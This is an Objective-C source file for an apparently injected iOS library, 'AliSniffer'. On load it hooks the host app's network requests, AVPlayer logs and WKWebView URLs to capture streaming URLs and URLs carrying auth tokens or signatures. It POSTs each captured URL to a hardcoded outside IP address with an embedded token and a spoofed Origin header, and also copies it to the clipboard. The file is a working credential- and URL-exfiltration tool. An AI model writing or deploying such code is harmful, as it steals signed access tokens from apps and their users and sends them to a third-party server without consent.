//
// AliSniffer.m — Passive + AVPlayer + WKWebView observer (FIXED for AV APIs)
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h> // <- 必须包含

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const NSTimeInterval kInstallDelay = 2.5;   // 注入后延迟安装被动模块
static const NSTimeInterval kWKScanInterval = 2.0; // 轮询扫描WKWebView间隔
static const BOOL kPopupOnAuth  = YES;
static const BOOL kPopupOnPlain = YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static BOOL g_installed = NO;

#pragma mark - 小工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
            if (![s isKindOfClass:[UIWindowScene class]]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}
static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static void popupLoaded(void){
    popup(@"AliSniffer 已加载", @"被动嗅探：NSURLProtocol+AVPlayer+WK 观测，不拦截；auth_key 优先；命中即弹窗+复制+上报。", nil);
}

#pragma mark - 判定/去重/上报

static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return ([s containsString:@"auth_key="] || [s containsString:@"txsecret="] ||
            [s containsString:@"txkey="] || [s containsString:@"sign="] ||
            [s containsString:@"token="] || [s containsString:@"auth="]);
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"]||[s containsString:@"phonelive"]||
        [s containsString:@"replay"]||[s containsString:@"pull."]||
        [s containsString:@"live"]||[s containsString:@"weizan"]||[s containsString:@"vzan"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}

static void handleURL(NSString *u, NSString *from){
    if (!u) return;
    if (!looksLikeStream(u)) return;
    if (dedupe_skip(u)) { LOG(@"dedupe skip: %@", u); return; }
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    LOG(@"Found URL [%@] from %@", u, from);
    postText(u);
    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
}

#pragma mark - NSURLProtocol 被动观测（不拦截）

@interface AliPassiveProtocol : NSURLProtocol
@end

@implementation AliPassiveProtocol
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    @try{
        NSString *u = request.URL.absoluteString;
        if (u.length) {
            if (looksLikeStream(u)) {
                dispatch_async(gq, ^{ handleURL(u, @"NSURLProtocol"); });
            }
        }
    }@catch(__unused NSException *e){}
    return NO; // 不接管、不拦截
}
+ (BOOL)canInitWithTask:(NSURLSessionTask *)task {
    @try{
        NSURLRequest *req = nil;
        if (task){
            if ([task respondsToSelector:@selector(currentRequest)]) req = task.currentRequest;
            if (!req && [task respondsToSelector:@selector(originalRequest)]) req = task.originalRequest;
        }
        NSString *u = req.URL.absoluteString;
        if (u.length) {
            if (looksLikeStream(u)) {
                dispatch_async(gq, ^{ handleURL(u, @"NSURLProtocol(Task)"); });
            }
        }
    }@catch(__unused NSException *e){}
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }
@end

#pragma mark - AVPlayer 监听（只读，从 accessLog 里取 URI（注意大写））

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
            @try{
                id item = note.object;
                if (!item) return;
                // 尝试从 accessLog 取得最后一个 event 的 URI
                if ([item respondsToSelector:@selector(accessLog)]) {
                    id log = [item accessLog];
                    if (log && [log respondsToSelector:@selector(events)]) {
                        NSArray *events = [log events];
                        if (events.count){
                            id ev = events.lastObject;
                            // AVPlayerItemAccessLogEvent 的 URI 属性方法名是 "URI"
                            if (ev && [ev respondsToSelector:@selector(URI)]) {
                                NSString *uri = nil;
                                // 使用 performSelector 安全取值
                                SEL sel = NSSelectorFromString(@"URI");
                                if ([ev respondsToSelector:sel]) {
                                    // ARC 下避免警告，使用 pragma
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                    uri = [ev performSelector:sel];
#pragma clang diagnostic pop
                                }
                                if (uri.length) dispatch_async(gq, ^{ handleURL(uri, @"AVPlayerAccessLog"); });
                            } else if (ev && [ev respondsToSelector:@selector(uri)]) {
                                // 兼容性保底（如果有小写实现）
                                SEL sel2 = NSSelectorFromString(@"uri");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                NSString *uri2 = [ev performSelector:sel2];
#pragma clang diagnostic pop
                                if (uri2.length) dispatch_async(gq, ^{ handleURL(uri2, @"AVPlayerAccessLog(uri)"); });
                            }
                        }
                    }
                }
            }@catch(__unused NSException *e){}
        }];

        [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
            @try{
                id item = note.object;
                if (!item) return;
                if ([item respondsToSelector:@selector(errorLog)]) {
                    id log = [item errorLog];
                    if (log && [log respondsToSelector:@selector(events)]) {
                        NSArray *events = [log events];
                        for (id ev in events){
                            if (!ev) continue;
                            // Try URI first
                            if ([ev respondsToSelector:@selector(URI)]) {
                                SEL sel = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                NSString *uri = [ev performSelector:sel];
#pragma clang diagnostic pop
                                if (uri.length) dispatch_async(gq, ^{ handleURL(uri, @"AVPlayerErrorLog"); });
                            } else if ([ev respondsToSelector:@selector(uri)]) {
                                SEL sel2 = NSSelectorFromString(@"uri");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                NSString *uri2 = [ev performSelector:sel2];
#pragma clang diagnostic pop
                                if (uri2.length) dispatch_async(gq, ^{ handleURL(uri2, @"AVPlayerErrorLog(uri)"); });
                            }
                        }
                    }
                }
            }@catch(__unused NSException *e){}
        }];

        LOG(@"AVPlayer observers installed");
    }@catch(__unused NSException *e){}
}

#pragma mark - WKWebView 轮询扫描并 KVO URL（只读）

@interface AliWKObserver : NSObject
@property (nonatomic, strong) NSHashTable *observed;
@end

@implementation AliWKObserver
- (instancetype)init{
    if (self = [super init]){
        _observed = [NSHashTable weakObjectsHashTable];
    }
    return self;
}
- (void)startScanLoop{
    __weak typeof(self) wself = self;
    dispatch_async(gq, ^{
        [wself scanAndObserveOnce];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kWKScanInterval * NSEC_PER_SEC)), dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
            [wself startScanLoop];
        });
    });
}
- (void)scanAndObserveOnce{
    @try{
        Class wkClass = NSClassFromString(@"WKWebView");
        if (!wkClass) return;
        NSArray *windows = UIApplication.sharedApplication.windows;
        for (UIWindow *w in windows){
            [self walkView:w];
        }
    }@catch(__unused NSException *e){}
}
- (void)walkView:(UIView*)v{
    @try{
        if (!v) return;
        Class wkClass = NSClassFromString(@"WKWebView");
        if (wkClass && [v isKindOfClass:wkClass]){
            if (![self.observed containsObject:v]){
                [self.observed addObject:v];
                dispatch_async(dispatch_get_main_queue(), ^{
                    @try{
                        [v addObserver:self forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
                        id url = [v valueForKey:@"URL"];
                        if (url && [url respondsToSelector:@selector(absoluteString)]){
                            NSString *u = [url absoluteString];
                            if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKWebViewInitial"); });
                        }
                    }@catch(__unused NSException *e){}
                });
            }
        }
        for (UIView *sub in v.subviews) [self walkView:sub];
    }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context{
    if (!object) return;
    if (![keyPath isEqualToString:@"URL"]) return;
    @try{
        id val = change[NSKeyValueChangeNewKey];
        if (val && [val respondsToSelector:@selector(absoluteString)]){
            NSString *u = [val absoluteString];
            if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKWebViewKVO"); });
        } else {
            id cur = [object valueForKey:@"URL"];
            if (cur && [cur respondsToSelector:@selector(absoluteString)]){
                NSString *u = [cur absoluteString];
                if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKWebViewKVO2"); });
            }
        }
    }@catch(__unused NSException *e){}
}
- (void)dealloc{
    for (id v in self.observed){
        @try{ [v removeObserver:self forKeyPath:@"URL"]; }@catch(...) {}
    }
}
@end

#pragma mark - 安装所有被动通道

static AliWKObserver *g_wkObserver = nil;

static void install_protocol(void){
    @try{
        [NSURLProtocol registerClass:AliPassiveProtocol.class];
        installAVObservers();
        if (!g_wkObserver) {
            g_wkObserver = [AliWKObserver new];
            [g_wkObserver startScanLoop];
        }
        popupLoaded();
        g_installed = YES;
        LOG(@"Passive modules installed");
    }@catch(__unused NSException *e){}
}

#pragma mark - 入口

__attribute__((constructor))
static void AliSnifferInit(void){
    @try{
        if (!gq) gq = dispatch_queue_create("com.alisniffer.passive", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInstallDelay * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            install_protocol();
        });
    }@catch(__unused NSException *e){}
}
